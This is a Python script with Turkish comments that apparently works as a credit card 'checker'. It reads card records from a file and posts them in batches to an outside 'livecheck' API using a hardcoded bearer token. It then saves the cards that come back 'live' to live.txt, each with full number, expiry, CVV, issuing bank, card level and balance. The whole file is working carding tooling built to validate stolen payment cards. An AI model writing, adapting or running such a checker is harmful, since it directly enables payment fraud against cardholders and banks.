#!/usr/bin/env python3
"""
KART SORGULAMA - output.txt -> live.txt
NMI Account Verification ile optimize edilmiş
"""

import requests
import time
import os
import sys
import json
from datetime import datetime

# ================== KONFİGÜRASYON ==================
API_URL = "https://jokerbalancecheck.onrender.com/livecheck"
AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"
INPUT_FILE = "output.txt"
OUTPUT_FILE = "live.txt"
BATCH_SIZE = 5  # NMI için küçük batch (hızlı cevap)
DELAY_BETWEEN_BATCHES = 2
MAX_RETRIES = 2
TIMEOUT = 45

# ================== FONKSİYONLAR ==================

def read_cards_from_file(filename):
    """Dosyadan kartları okur"""
    if not os.path.exists(filename):
        print(f"[!] Dosya bulunamadı: {filename}")
        print(f"[!] Çalışma dizini: {os.getcwd()}")
        return []
    
    with open(filename, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    print(f"[+] {len(cards)} kart okundu: {filename}")
    return cards

def save_live_card(card_data, filename):
    """Live kartı dosyaya kaydeder"""
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(card_data + '\n')

def check_batch(cards_batch):
    """Bir batch'i API'ye gönderir"""
    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }
    
    for attempt in range(MAX_RETRIES):
        try:
            print(f"   📤 {len(cards_batch)} kart gönderiliyor (deneme {attempt+1}/{MAX_RETRIES})...")
            
            response = requests.post(
                API_URL,
                json=cards_batch,
                headers=headers,
                timeout=TIMEOUT
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"   ❌ HTTP {response.status_code}: {response.text[:100]}")
                
        except requests.exceptions.Timeout:
            print(f"   ⏱️ Zaman aşımı (deneme {attempt+1}/{MAX_RETRIES})")
        except requests.exceptions.ConnectionError:
            print(f"   🔌 Bağlantı hatası (deneme {attempt+1}/{MAX_RETRIES})")
        except Exception as e:
            print(f"   ❌ Hata: {str(e)[:50]} (deneme {attempt+1}/{MAX_RETRIES})")
        
        if attempt < MAX_RETRIES - 1:
            time.sleep(2)
    
    return None

def process_cards(cards):
    """Tüm kartları batch'ler halinde işler"""
    total = len(cards)
    processed = 0
    live_count = 0
    failed_batches = []
    
    print(f"\n[+] Toplam {total} kart işlenecek")
    print(f"[+] Batch boyutu: {BATCH_SIZE}")
    print(f"[+] API: {API_URL}")
    print("=" * 70)
    
    # Önce dosyayı temizle
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
        print(f"[+] Eski {OUTPUT_FILE} dosyası silindi")
    
    for i in range(0, total, BATCH_SIZE):
        batch = cards[i:i+BATCH_SIZE]
        batch_num = (i // BATCH_SIZE) + 1
        total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
        
        print(f"\n[Batch {batch_num}/{total_batches}] {len(batch)} kart kontrol ediliyor...")
        
        # Batch'i API'ye gönder
        result = check_batch(batch)
        
        if result and "results" in result:
            # Sonuçları işle
            for card_result in result["results"]:
                processed += 1
                
                # Live ise kaydet
                if card_result.get("live", False):
                    live_count += 1
                    
                    # Orijinal kart bilgilerini al
                    card_data = card_result.get("card", {})
                    pan = card_data.get("pan", "unknown")
                    month = card_data.get("month", "xx")
                    year = card_data.get("year", "xxxx")
                    cvv = card_data.get("cvv", "xxx")
                    
                    # BIN bilgilerini al
                    bin_info = card_result.get("bin", {})
                    brand = bin_info.get("brand", "UNKNOWN")
                    bank = bin_info.get("bank", "Unknown")
                    card_type = bin_info.get("type", "UNKNOWN")
                    level = bin_info.get("level", "UNKNOWN")
                    country_code = bin_info.get("country", "XX")
                    country_name = bin_info.get("country_name", "Unknown")
                    
                    # Balance ve gateway
                    balance = card_result.get("balance", "0.00")
                    gateway = card_result.get("gateway", "unknown")
                    result_code = card_result.get("result_code", "")
                    result_text = card_result.get("result_text", "")
                    
                    # Format: PAN|AY|YIL|CVV|ÜLKE|BANKA|TIP|LEVEL|BALANCE|GATEWAY
                    live_line = f"{pan}|{month}|{year}|{cvv}|{country_code}|{bank}|{card_type}|{level}|{balance}|{gateway}"
                    
                    save_live_card(live_line, OUTPUT_FILE)
                    print(f"   ✅ LIVE: {pan[:6]}****{pan[-4:]} | {brand} | ${balance} | {gateway}")
                    
                    # Detaylı bilgi varsa göster
                    if result_text:
                        print(f"      📝 {result_text}")
                else:
                    # Dead kart
                    card_data = card_result.get("card", {})
                    pan = card_data.get("pan", "unknown")
                    error = card_result.get("error", "")
                    if error:
                        print(f"   ❌ DEAD: {pan[:6]}****{pan[-4:]} | {error[:50]}")
                    else:
                        print(f"   ❌ DEAD: {pan[:6]}****{pan[-4:]}")
            
            print(f"   📊 Canlı: {live_count} | İşlenen: {processed}/{total}")
            
        else:
            print(f"   [!] Batch {batch_num} başarısız!")
            failed_batches.append(batch_num)
        
        # Batch arası bekle
        if i + BATCH_SIZE < total:
            print(f"   ⏳ {DELAY_BETWEEN_BATCHES} saniye bekleniyor...")
            time.sleep(DELAY_BETWEEN_BATCHES)
    
    # Özet
    print("\n" + "=" * 70)
    print(f"[✓] İŞLEM TAMAMLANDI!")
    print(f"[✓] Toplam: {total} kart")
    print(f"[✓] Canlı: {live_count} kart")
    print(f"[✓] Ölü: {total - live_count} kart")
    print(f"[✓] Başarı oranı: {(live_count/total*100):.1f}%")
    print(f"[✓] Live kartlar kaydedildi: {OUTPUT_FILE}")
    
    if failed_batches:
        print(f"[!] Başarısız batch'ler: {failed_batches}")
    
    # Live kartları göster
    if live_count > 0 and os.path.exists(OUTPUT_FILE):
        print("\n[+] Live kartlar (ilk 10):")
        with open(OUTPUT_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines[:10]:
                parts = line.strip().split('|')
                if len(parts) >= 5:
                    pan = parts[0]
                    country = parts[4] if len(parts) > 4 else "-"
                    bank = parts[5] if len(parts) > 5 else "-"
                    card_type = parts[6] if len(parts) > 6 else "-"
                    level = parts[7] if len(parts) > 7 else "-"
                    balance = parts[8] if len(parts) > 8 else "0.00"
                    print(f"   💳 {pan[:6]}****{pan[-4:]} | {country} | {bank} | {card_type} | {level} | ${balance}")

def main():
    print("=" * 70)
    print("   🔥 KART SORGULAMA - NMI + Live Check 🔥")
    print("=" * 70)
    print(f"[+] Input: {INPUT_FILE}")
    print(f"[+] Output: {OUTPUT_FILE}")
    print(f"[+] Batch: {BATCH_SIZE}")
    print("=" * 70)
    
    # Kartları oku
    cards = read_cards_from_file(INPUT_FILE)
    
    if not cards:
        print("[!] Hiç kart bulunamadı. Çıkılıyor...")
        print("[!] output.txt dosyasını kontrol edin.")
        return
    
    # Kontrol et
    process_cards(cards)

if __name__ == "__main__":
    main()